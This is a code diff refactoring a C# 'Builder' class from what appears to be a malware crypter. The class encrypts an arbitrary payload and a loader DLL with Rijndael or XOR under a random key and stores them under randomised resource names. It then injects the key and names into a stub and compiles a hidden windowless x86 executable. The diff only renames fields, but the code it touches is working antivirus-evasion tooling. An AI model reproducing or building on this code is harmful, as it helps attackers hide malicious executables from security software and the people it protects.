@@ -12,33 +12,33 @@ namespace Crypt
 {
     class Builder
     {
-        Byte[] payload;
-        Options options;
-        string loaderPath;
+        private Byte[] _payload;
+        private Options _options;
+        private string _loaderPath;
 
         public Builder(byte[] payload, Options options)
         {
-            this.payload = payload;
-            this.options = options;
+            _payload = payload;
+            _options = options;
 
             //Super hacky
             //TODO: Find better way to access Loader.dll
 #if DEBUG
-            loaderPath = @"..\..\..\Loader\bin\Debug\Loader.dll";
+            _loaderPath = @"..\..\..\Loader\bin\Debug\Loader.dll";
 #else
-            loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
+            _loaderPath = @"..\..\..\Loader\bin\Release\Loader.dll";
 #endif
         }
 
         public bool Build()
         {
-            options.encryptionKey = Encryption.GenerateKey();
-            options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
-            options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
-            options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);
+            _options.encryptionKey = Encryption.GenerateKey();
+            _options.resFileName = Guid.NewGuid().ToString().Substring(0, 5);
+            _options.resPayloadName = Guid.NewGuid().ToString().Substring(0, 5);
+            _options.resLoaderName = Guid.NewGuid().ToString().Substring(0, 5);
 
-            Byte[] encPayload = Encrypt(payload);
-            Byte[] encLoader = Encrypt(File.ReadAllBytes(loaderPath));
+            Byte[] encPayload = Encrypt(_payload);
+            Byte[] encLoader = Encrypt(File.ReadAllBytes(_loaderPath));
             string stubSrc = AddInfo(Properties.Resources.Stub);
 
             bool result = Compile(encPayload, encLoader, stubSrc);
@@ -48,14 +48,13 @@ namespace Crypt
         private byte[] Encrypt(Byte[] input)
         {
             Byte[] encryptedPL;
-            switch (options.encryptionType)
+            switch (_options.encryptionType)
             {
                 case EncryptionType.Rijndael:
-                    encryptedPL = Encryption.RijndaelEncrypt(input, options.encryptionKey);
+                    encryptedPL = Encryption.RijndaelEncrypt(input, _options.encryptionKey);
                     break;
-                case EncryptionType.XOR:
                 default:
-                    encryptedPL = Encryption.Xor(input, options.encryptionKey);
+                    encryptedPL = Encryption.Xor(input, _options.encryptionKey);
                     break;
             }
 
@@ -64,21 +63,21 @@ namespace Crypt
 
         private string AddInfo(string stubSrc)
         {
-            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(options.encryptionKey));
-            newStub = newStub.Replace("[resFileName]", options.resFileName);
-            newStub = newStub.Replace("[resPayloadName]", options.resPayloadName);
-            newStub = newStub.Replace("[resLoaderName]", options.resLoaderName);
+            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(_options.encryptionKey));
+            newStub = newStub.Replace("[resFileName]", _options.resFileName);
+            newStub = newStub.Replace("[resPayloadName]", _options.resPayloadName);
+            newStub = newStub.Replace("[resLoaderName]", _options.resLoaderName);
 
             return newStub;
         }
 
         private string CreateResource(byte[] encPayload, byte[] encLoader)
         {
-            string resourceDir = options.resFileName + ".resources";
+            string resourceDir = _options.resFileName + ".resources";
             using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
             {
-                resourceWriter.AddResource(options.resPayloadName, encPayload);
-                resourceWriter.AddResource(options.resLoaderName, encLoader);
+                resourceWriter.AddResource(_options.resPayloadName, encPayload);
+                resourceWriter.AddResource(_options.resLoaderName, encLoader);
                 resourceWriter.Generate();
             }
             return resourceDir;
@@ -89,7 +88,7 @@ namespace Crypt
             CompilerParameters compParams = new CompilerParameters();
             compParams.GenerateExecutable = true;
             compParams.TreatWarningsAsErrors = false;
-            compParams.OutputAssembly = options.buildDir;
+            compParams.OutputAssembly = _options.buildDir;
             compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";
 
             compParams.ReferencedAssemblies.Add("System.dll");
